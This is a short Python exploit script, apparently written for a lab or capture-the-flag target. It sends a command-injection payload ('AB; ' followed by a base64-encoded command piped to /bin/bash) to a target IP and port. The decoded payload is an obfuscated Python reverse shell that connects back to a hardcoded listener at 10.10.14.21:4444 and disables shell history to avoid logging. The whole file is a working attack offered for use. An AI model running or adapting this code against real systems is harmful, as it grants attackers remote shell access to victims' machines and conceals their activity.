import sys
import socket
import base64
try:
    # Sets the target ip and port from system arguments
    TargetIP = sys.argv[1]
    TargetPort = int(sys.argv[2])

    # Sets the local ip and port (address and port to listen on)
    LocalIP = '10.10.14.21' # CHANGE THIS
    LocalPort = '4444' # CHANGE THIS 
    
    # craft out payload from a python reverse shell and then gets base64 encoded
    Text = 'python -c "import os;import pty;import socket;tLnCwQLCel=\'' + LocalIP + '\';EvKOcV=' + LocalPort + ';QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
    base = base64.b64encode(Text)
    Payload = 'echo ' + base + '|base64 -d|/bin/bash'

    # our socket to interact with and send payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TargetIP, TargetPort))
    
    # we send our payload and check our listener
    s.sendall('AB; ' + Payload + ' \n')
    
    #check display any response from the server
    data = s.recv(1024)
    s.close()
    print(repr(data))
except:
    print("Usage: exploit.py [Target IP] [Target Port]")
